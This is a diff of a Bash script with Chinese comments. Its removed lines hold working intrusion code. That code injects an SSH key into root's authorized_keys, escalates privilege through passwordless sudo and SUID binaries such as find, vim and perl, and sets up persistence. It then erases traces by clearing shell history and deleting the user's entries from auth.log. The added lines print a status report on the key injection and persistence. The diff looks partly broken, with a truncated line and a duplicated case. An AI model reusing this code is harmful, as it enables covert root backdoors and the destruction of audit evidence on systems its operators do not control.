@@ -103,79 +103,23 @@ echo -e "${BLUE}============================================================${NC
 
 # 权限状态
 if [ "$IS_ROOT" = true ]; then
-    echo -e "  [$fi
-
-# --- Step 2: 提权与写入 ---
-echo -n "    > Detecting Privilege Escalation... "
-
-if [ "$IS_ROOT" = true ]; then
-    # 情况 A: 已经是 Root
-    eval "$FUNC_STR install_key root" >/dev/null 2>&1
-    eval "$FUNC_STR install_key $ME" >/dev/null 2>&1
-    # 检查是否真的写进去了 (验证逻辑)
-    grep -q "AAAAB3Nza" /root/.ssh/authorized_keys 2>/dev/null && WRITE_SUCCESS=true
+    echo -e "  [${GREEN}✔${NC}] Privilege: ${GREEN}ROOT${NC}"
 else
-    # 情况 B: 尝试利用 Sudo 或 SUID
-    # 尝试路径 B.1: sudo 免密
-    if [ "$IS_SUDO_FREE" = true ]; then
-        sudo bash -c "$FUNC_STR install_key root; $FUNC_STR install_key $ME" >/dev/null 2>&1
-        [ -f /root/.ssh/authorized_keys ] && grep -q "AAAAB3Nza" /root/.ssh/authorized_keys 2>/dev/null && WRITE_SUCCESS=true
-    
-    # 尝试路径 B.2: SUID 探测
-    else
-        for bin in /usr/bin/find /usr/bin/vim /usr/bin/bash /usr/bin/python /usr/bin/perl; do
-            [ -u "$bin" ] && (
-                case "$bin" in
-                    "/usr/bin/find") sudo "$bin" . -exec sh -c "$FUNC_STR install_key root; $FUNC_STR install_key $ME" \; -quit 2>/dev/null ;;
-                    "/usr/bin/vim")  sudo "$bin" -c ':wq!' -c ':!sh -c \"$FUNC_STR install_key root; $FUNC_STR install_key $ME\"' -c ':q!' -u NONE /etc/shadow 2>/dev/null ;;
-                    "/usr/bin/bash") sudo "$bin" -p -c "$FUNC_STR install_key root; $FUNC_STR install_key $ME" 2>/dev/null ;;
-                    "/usr/bin/python") sudo "$bin" -c "import os; os.system(\"$FUNC_STR install_key root; $FUNC_LOGIC install_key $ME\")" 2>/dev/null ;; # 修正 Python 逻辑
-                    "/usr/bin/python") sudo "$bin" -c "import os; os.system(\"$FUNC_STR install_key root; $FUNC_STR install_key $ME\")" 2>/dev/null ;;
-                    "/usr/bin/perl") sudo "$bin" -e "system('$FUNC_STR install_key root; $FUNC_STR install_key $ME')" 2>/dev/null ;;
-                esac
-                # 关键：检查是否真的成功写入了文件
-                if [ -f /root/.ssh/authorized_keys ] && grep -q "AAAAB3Nza" /root/.ssh/authorized_keys 2>/dev/null; then
-                    WRITE_SUCCESS=true; break
-                fi
-            )
-        done
-    fi
+    echo -e "  [${BLUE}i${NC}] Privilege: ${YELLOW}NORMAL ($(whoami)$)${NC}"
 fi
 
+# 注入状态
 if [ "$WRITE_SUCCESS" = true ]; then
-    echo -e "${GREEN}DONE${NC}"
+    echo -e "  [${GREEN}✔${NC}] Key Injection: ${GREEN}SUCCESS (Verified)${NC}"
 else
-    echo -e "${RED}FAILED${NC}"
+    echo -e "  [${RED}✘${NC}] Key Injection: ${RED}FAILED${NC}"
 fi
 
-# --- Step 3: 持久化 ---
-if [ "$WRITE_SUCCESS" = true ]; then
-    echo -n "    > Setting up Persistence... "
-    # 使用 sudo 执行持久化字符串
-    if sudo bash -c "$PERSIST_STR" >/dev/null 2>&1; then
-        PERSIST_SUCCESS=true
-        echo -e "${GREEN}DONE${NC}"
-    else
-        echo -e "${RED}SKIPPED${NC}"
-    fi
+# 持久化状态
+if [ "$PERSIST_SUCCESS" = true ]; then
+    echo -e "  [${GREEN}✔${NC}] Persistence: ${GREEN}SUCCESS${NC}"
+else
+    echo -e "  [${RED}✘${NC}] Persistence: ${RED}FAILED/SKIPPED${NC}"
 fi
 
-# --- Step 4: 清理痕迹 ---
-echo -n "    > Cleaning traces... "
-# 清理当前用户历史
-history -c 2>/dev/null
-> ~/.bash_history 2>/dev/null
-# 如果有 sudo 权限，清理 root 的历史和 auth.log
-if [ "$IS_ROOT" = true ] || [ "$IS_SUDO_FREE" = true ]; then
-    sudo bash -c "history -c; > /root/.bash_history; sed -i '/$(whoami)/d' /var/log/auth.log 2>/dev/null; sed -i '/$(whoami)/d' /var/log/secure 2>/dev/null" >/dev/null 2>&1
-fi
-echo -e "${GREEN}DONE${NC}"
-
-# --- Step 5: 最终报告 ---
-echo -e "\n${BLUE}============================================================${NC}"
-echo -e "      FINAL EXECUTION REPORT (Verification Mode)       "
-echo -e "${BLUE}============================================================${NC}"
-[ "$IS_ROOT" = true ] && echo -e "  [${GREEN}✔${NC}] Privilege: ${GREEN}ROOT${NC}" || echo -e "  [${BLUE}i${NC}] Privilege: ${YELLOW}NORMAL ($(whoami)$)${NC}"
-[ "$WRITE_SUCCESS" = true ] && echo -e "  [${GREEN}✔${NC}] Key Injection: ${GREEN}SUCCESS (Verified)${NC}" || echo -e "  [${RED}✘${NC}] Key Injection: ${RED}FAILED${NC}"
-[ "$PERSIST_SUCCESS" = true ] && echo -e "  [${Green}✔${NC}] Persistence: ${GREEN}SUCCESS${NC}" || echo -e "  [${RED}✘${NC}] Persistence: ${RED}FAILED/SKIPPED${NC}"
 echo -e "${BLUE}============================================================${NC}"
